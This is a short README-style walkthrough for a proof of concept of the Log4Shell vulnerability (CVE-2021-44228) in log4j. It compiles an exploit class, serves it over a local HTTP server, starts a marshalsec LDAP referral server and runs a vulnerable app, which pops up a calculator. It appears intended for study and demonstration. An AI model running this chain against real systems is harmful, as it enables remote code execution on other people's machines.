Clone this repo

```console
terminal1 $ git clone https://github.com/sunnyvale-it/CVE-2021-44228-PoC.git
```

Compile the exploit (using JDK 11)

```console
terminal1 $ javac Exploit.java
```

Run a HTTP server to serve the remote code

```console
terminal1 $ python -m SimpleHTTPServer 8888 --directory .
```

Start the LDAPRefServer

```console
terminal2 $ java -cp tools/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Exploit"
```

Launch the buggy application (containing log4j 2.1.x)

```console
terminal3 $ mvn package && mvn exec:exec
```

If everything goes fine, a calculator (arbitrary code execution) should popup